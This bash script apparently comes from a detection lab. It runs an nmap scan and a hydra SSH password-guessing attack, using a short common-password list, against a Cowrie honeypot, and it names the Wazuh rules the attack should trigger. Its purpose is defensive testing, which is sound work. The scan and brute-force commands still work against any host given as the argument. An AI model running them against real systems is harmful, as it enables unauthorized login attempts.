#!/usr/bin/env bash
# Attack scenario 1: SSH brute force against the Cowrie honeypot (LAB ONLY).
#
# ATT&CK: T1046 Network Service Discovery, T1110 Brute Force
# Run from Kali on the attacker network (192.168.1.0/24).
# Target: the honeypot on Docker-DMZ (192.168.14.10, port 22).
#
# What should happen in the SIEM (rules in detections/wazuh/cowrie_rules.xml):
#   100101  new connection to the honeypot
#   100102  failed login attempts
#   100103  a login the honeypot accepted
#   100110  5 failed logins in 60 seconds from one address (brute force)
set -u
TARGET="${1:-192.168.14.10}"

WORDLIST="$(mktemp)"
# Passwords Cowrie rejects by default (root, 123456) mixed with ones it accepts.
printf '%s\n' root 123456 toor admin password letmein qwerty 12345 test guest > "$WORDLIST"

echo "[1/2] Port scan of $TARGET (service discovery)"
nmap -sS -p 22,80,3306 "$TARGET" | grep -E 'open|closed|filtered'

echo "[2/2] Password guessing against SSH on $TARGET with $(wc -l < "$WORDLIST") candidates"
hydra -l root -P "$WORDLIST" -t 4 -I "ssh://$TARGET" 2>&1 | grep -E 'login:|host:|valid|failed|ATTACK|finished' || true

rm -f "$WORDLIST"
echo "Done. Check the Wazuh dashboard or alerts.json for rules 100101 to 100110."
